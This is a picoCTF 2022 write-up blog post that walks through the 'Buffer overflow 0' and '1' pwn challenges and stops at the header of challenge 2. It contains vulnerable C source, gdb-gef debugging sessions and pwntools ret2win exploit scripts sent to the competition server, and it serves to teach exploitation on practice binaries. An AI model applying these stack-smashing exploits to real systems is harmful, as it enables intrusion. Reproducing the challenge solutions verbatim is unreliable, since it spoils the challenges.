---
title: "pico22/pwn: Buffer overflow series"
date: 2022-06-16 12:16:08
categories:
- ctfs
- pico22
- pwn
tags:
- pwn
- buffer-overflow
description: "Learn how to exploit vulnerable C functions to break the program, eventually controlling the flow of code execution! This is a writeup for the picoCTF 2022 binary/pwn series \"Buffer overflow\"."
permalink: ctfs/pico22/pwn/buffer-overflow-series/
thumbnail: /asset/banner/banner-buffer-overflow.png
---

<script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }

    .text-warning {
        border: 1px solid #481219;
        border-radius: 5px;
        background-color: #481219;
        padding: 1rem;
        font-size: 90%;
        text-align: center;
    }

    .text-info {
        border: 1px solid #35678C;
        border-radius: 5px;
        background-color: #35678C;
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }

    .no-highlight {
        user-select: none;
        -moz-user-select: none;
        -webkit-user-select: none;
        -ms-user-select: none;
    }
</style>

### Intro

This is a writeup for the buffer overflow series during the **picoCTF 2022** competition. This was arguably my favorite set of challenges, as beforehand I'd never stepped into the realm of binary exploitation/pwn. I learned a lot from this, so I highly recommend solving it by yourself before referencing this document. Cheers!

## Buffer overflow 0

<div class="box no-highlight">
  Smash the stack! Let's start off simple: can you overflow the correct buffer? The program is available <a href="asset/pico22/buffer-overflow/vuln-0">here</a>. You can view source <a href="asset/pico22/buffer-overflow/vuln-0.c">here</a>, and connect with it using:<br><code>nc saturn.picoctf.net 65535</code><br><br><b>Authors</b>: Alex Fulton, Palash Oswal
  <details><summary><b>Hints:</b></summary><br>1. How can you trigger the flag to print?<br>2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.<br>3. Run <code>man gets</code> and read the BUGS section. How many characters can the program really read?</details>
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span class="meta prompt_">$ </span> checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
</pre>
      </td>
    </tr>
  </table>
</figure>


Let's check out our source code:

{% codeblock vuln-0.c lang:c https://enscribe.dev/asset/pico22/buffer-overflow/vuln-0.c <span style="color:#82C4E4">[download source]</span> %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

{% endcodeblock %}

The first thing we should do is check how the flag is printed. Looks like it's handled in a `sigsegv_handler()` function:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
/* ... */
signal(SIGSEGV, sigsegv_handler);
```

Researching online, a "SIGSEGV" stands for a **segmentation fault**, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag `printf()` resides within `sigsegv_handler()`, then we can safely assume that we must figure out how to trigger a segmentation fault.

We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the user input) onto the stack. This function sucks, as it will write the user's input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:

<figure class="highlight console">
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc saturn.picoctf.net 65535</span></span><br><span class="line">Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}</span><br></pre>
      </td>
    </tr>
  </table>
</figure>

---

## Buffer overflow 1

<div class="box no-highlight">
  Control the return address.<br>
  Now we're cooking! You can overflow the buffer and return to the flag function in the <a href="asset/pico22/buffer-overflow/vuln-1">program</a>. You can view source <a href="asset/pico22/buffer-overflow/vuln-1.c">here</a>. And connect with it using:<br> <code>nc saturn.picoctf.net [PORT]</code><br><br>
  <b>Authors</b>: Sanjay C., Palash Oswal
  <details><summary><b>Hints:</b></summary><br>1. Make sure you consider big Endian vs small Endian.<br>2. Changing the address of the return pointer can call different functions.</details>
</div>

<div class="text-warning">
<i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
</pre></td></tr></table></figure>

Let's check out our source code:

{% codeblock vuln-1.c lang:c https://enscribe.dev/asset/pico22/buffer-overflow/vuln-1.c <span style="color:#82C4E4">[download source]</span> %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
{% endcodeblock %}

In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.

### Part I: Explaining the Stack

Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:

<img src="/asset/pico22/buffer-overflow/stack-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">

Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.

We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:

<img src="/asset/pico22/buffer-overflow/overflow-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">

If we are deliberate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!

### Part II: Smashing the Stack

To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:

<figure class="highlight text">
  <figcaption><span>GEF - "GDB enhanced features"</span><a target="_blank" rel="noopener"
      href="https://gef.readthedocs.io/en/master/"><span style="color:#82C4E4">[documentation]</span></a></figcaption>
<table><tr><td class="code"><pre><span style="color:#EC0101"><b>gef➤  </b></span>b main
Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
<span style="color:#EC0101"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="color:#FEA44C">main</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0xf7fa39e8  →  <span style="color:#9755B3">0xffffd20c</span>  →  <span style="color:#9755B3">0xffffd3d1</span>  →  <span style="color:#FEA44C">"SHELL=/usr/bin/bash"</span>
<span style="color:#367BF0">$ebx   </span>: 0x0       
<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd194</span>  →  0x00000000
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd140</span>  →  <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$ebp   </b></span>: <span style="color:#9755B3">0xffffd148</span>  →  0x00000000
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: <span style="color:#D41919">0x80492d7</span>  →  <span style="color:#585858"><b>&lt;main+19&gt; sub esp, 0x10</b></span>
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x80492d3 &lt;main+15&gt;        mov    ebp, esp</b></span>
   <span style="color:#585858"><b> 0x80492d5 &lt;main+17&gt;        push   ebx</b></span>
   <span style="color:#585858"><b> 0x80492d6 &lt;main+18&gt;        push   ecx</b></span>
 <span style="color:#5EBDAB">→  0x80492d7 &lt;main+19&gt;        sub    esp, 0x10</span>
    0x80492da &lt;main+22&gt;        call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;
    0x80492df &lt;main+27&gt;        add    ebx, 0x2d21
    0x80492e5 &lt;main+33&gt;        mov    eax, DWORD PTR [ebx-0x4]
    0x80492eb &lt;main+39&gt;        mov    eax, DWORD PTR [eax]
    0x80492ed &lt;main+41&gt;        push   0x0
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span></pre></td></tr></table></figure>

Analyzing this breakpoint, if we look at the arrow on the assembly code, we can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:

<figure class="highlight text"><table> <tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x41414141</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x41414141
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x41414141</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></figure>

<div style="margin-top:-2.5%; margin-bottom:2.5%;">Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address <code>0x41414141</code>, which doesn&#39;t exist! This is because our <code>$eip</code> was overwritten by all our <code>A</code>s (<code>0x41</code> in hex = <code>A</code> in ASCII).</div>

### Part III: Finessing the Stack

Although we've managed to smash the stack, we still don't know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:

<figure class="highlight text"><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
<span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x6161616c</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x6161616a (&quot;<span style="color:#FEA44C">jaaa</span>&quot;?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  0x00000000
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x6161616b (&quot;<span style="color:#FEA44C">kaaa</span>&quot;?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x6161616c (&quot;<span style="color:#FEA44C">laaa</span>&quot;?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x6161616c
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: &quot;vuln&quot;, <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x6161616c</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
</pre></td></tr></table></figure>

<div style="margin-top:-2.5%; margin-bottom:2.5%">We can see that <code>$eip</code> is currently overflowed with the pattern <code>0x6161616c</code> (<code>laaa</code>). let&#39;s search for this pattern using <code>pattern search</code>:</div>

<figure class="highlight plaintext">
  <figcaption><span>GEF pattern command</span><a target="_blank" rel="noopener"
      href="https://gef.readthedocs.io/en/master/commands/pattern/"><span style="color:#82C4E4">[documentation]</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
<span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 41 (big-endian search) 
</pre>
      </td>
    </tr>
  </table>
</figure>


To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:

<figure class="highlight console">
  <figcaption><span>readelf command</span><a target="_blank" rel="noopener"
      href="https://man7.org/linux/man-pages/man1/readelf.1.html"><span style="color:#82C4E4">[documentation]</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span><br></pre>
      </td>
    </tr>
  </table>
</figure>


Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:

<figure class="highlight text">
  <figcaption><span>GDB x command</span><a target="_blank" rel="noopener"
      href="https://visualgdb.com/gdbreference/commands/x"><span style="color:#82C4E4">[documentation]</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
<pre><span style="color:#47D4B9"><b>gef➤  </b></span>x win
<span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3
</pre>      </td>
    </tr>
  </table>
</figure>


Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
Let's make a final visual of our payload:

![Payload Visual](asset/pico22/buffer-overflow/payload-visual.png)

Let's write our payload and send it to the remote server with Python3/pwntools:

{% codeblock lang:py buffer-overflow-1.py https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394 <span style="color:#82C4E4">[github gist link]</span> %}
#!/usr/bin/env python3
from pwn import *

payload = b"A"*44 + p32(0x80491f6)  # Little endian: b'\xf6\x91\x04\x08'
host, port = "saturn.picoctf.net", [PORT]

p = remote(host, port)      # Opens the connection
log.info(p.recvS())         # Decodes/prints "Please enter your string:"
p.sendline(payload)         # Sends the payload
log.success(p.recvallS())   # Decodes/prints all program outputs
p.close()                   # Closes the connection
{% endcodeblock %}

Let's try running the script on the server:

<figure class="highlight text"><table><tr><td class="code">
<pre><span class="meta prompt_">$ </span>python3 buffer-overflow-1.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
</pre></td></tr></table></figure>

We have completed our first `ret2win` buffer overflow on a x32 binary! Yet, this is just the beginning. How about we spice things up a little bit?

### Part IV: Automating the Stack

Although the concept of buffer overflows can seem daunting to newcomers, experienced pwners will often find these sorts of challenges trivial, and don't want to spend the effort manually finding offsets and addresses just to send the same type of payload. This is where our best friend comes in: **pwntools** helper functions and automation! Let's start with the first part - the `$eip` offset for x32 binaries.

The main helper we will be using is [`pwnlib.elf.corefile`](https://docs.pwntools.com/en/stable/elf/corefile). It can parse [core dump](https://www.ibm.com/docs/en/aix/7.1?topic=formats-core-file-format) files, which are generated by Linux whenever errors occur during a running process. These files take an **image** of the process when the error occurs, which may assist the user in the debugging process. Remember when we sent a large `cyclic` pattern which was used to cause a segmentation fault? We'll be using the core dump to view the state of the registers during that period, without needing to step through it using GDB. We'll be using the coredump to eventually find the offset!

<div class="text-info">
<i class="fa-solid fa-circle-info"></i> Info: Many Linux systems do not have core dumps properly configured. For bash, run <code>ulimit -c unlimited</code> to generate core dumps of unlimited size. For tsch, run <code>limit coredumpsize unlimited</code>. By default, cores are dumped into either the current directory or <code>/var/lib/systemd/coredump</code>.
</div>

Before we start, let's work through the steps with command-line Python. First, let's import the pwntools global namespace and generate an `elf` object using pwntool's `ELF()`:

<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre><span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">>>></span> from pwn import *
<span class="meta prompt_">>>></span> elf = context.binary = ELF('./vuln')
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
</pre> </td></tr></table></figure>

We can then generate a `cyclic()` payload and start a local process referencing the aforementioned `elf` object. Sending the payload and using the [`.wait()`](https://www.educba.com/python-wait/) method will throw an exit code -11, which signals a segmentation fault and generates a core dump. 

<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre style="white-space: pre-wrap"><span class="meta prompt_">>>></span> p = process(elf.path)
[<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
<span class="meta prompt_">>>></span> p.sendline(cyclic(128))
<span class="meta prompt_">>>></span> p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2219)
<span class="meta prompt_">>>></span> exit()
<span class="meta prompt_">$ </span>ls -al
total 2304
drwxr-xr-x  3 kali kali    4096 Jun 16 15:35 <span style="color:#277FFF"><b>.</b></span>
drwxr-xr-x 16 kali kali    4096 Jun 14 17:13 <span style="color:#277FFF"><b>..</b></span>
-rw-------  1 kali kali 2588672 Jun 16 15:35 core
-rw-r--r--  1 kali kali     358 Jun 16 03:22 buffer-overflow-1.py
-rwxr-xr-x  1 kali kali   15704 Mar 15 02:45 <span style="color:#47D4B9"><b>vuln</b></span>
-rw-r--r--  1 kali kali     769 Mar 15 02:45 vuln.c
</pre> </td></tr></table></figure>

We can now create a corefile object and freely reference registers! To find the offset, we can simply call the object key within `cyclic_find()`.

<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">>>></span> core = Corefile('./core')
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xff93abe0
    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
    Fault:     0x6161616c
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>></span> core.registers
{'eax': 65, 'ebp': 1633771883, 'ebx': 1633771882, 'ecx': 65, 'edi': 134516960, 'edx': 4294967295, 'eflags': 66178, 'eip': 1633771884, 'esi': 1, 'esp': 4287867872, 'orig_eax': 4294967295, 'xcs': 35, 'xds': 43, 'xes': 43, 'xfs': 0, 'xgs': 99, 'xss': 43}
<span class="meta prompt_">>>></span> hex(core.eip)
'0x6161616c'
</pre></td></tr></table></figure>
</figure>

Now that we know how ELF objects and core dumps work, let's apply them to our previous script. Another cool helper I would like to implement is [`flat()`](https://docs.pwntools.com/en/stable/util/packing.html) (which has a great tutorial [here](https://www.youtube.com/watch?v=AMDbbuLaXfk), referred to by the legacy alias `fit()`), which flattens arguments given in lists, tuples, or dictionaries into a string with `pack()`. This will help us assemble our payload without needing to concatenate seemingly random strings of `A`s and little-endian addresses, increasing readability.

This is my final, completely automated script:

{% codeblock lang:py buffer-overflow-1-automated.py https://gist.github.com/jktrn/b1586f403c6ae31ce0e128b8f96faad6 <span style="color:#82C4E4">[github gist link]</span> %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # references elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parse core dump file

payload = flat({
    cyclic_find(core.eip): elf.symbols.win    # offset:address
})

if args.REMOTE:    # remote process if arg
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()    # receives flag
{% endcodeblock %}

Let's run the script on the server:

<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">$ </span>python3 buffer-overflow-1-automated.py REMOTE
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xff829260
    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
    Fault:     0x6161616c
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}[<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
</pre></td></tr></table></figure>

We've successfully automated a solve on a simple x32 buffer overflow!

---

## Buffer overflow 2

<div class="box no-highlight">
  Control the return address and arguments<br>This time you'll need to control the arguments to the function you return to! Can you get the flag from this  <a href="asset/pico22/buffer-overflow/vuln-2">program</a>?<br>You can view source <a href="asset/pico22/buffer-overflow/vuln-2.c">here</a>. And connect with it using  <code>nc saturn.picoctf.net [PORT]</code>
<br><br>
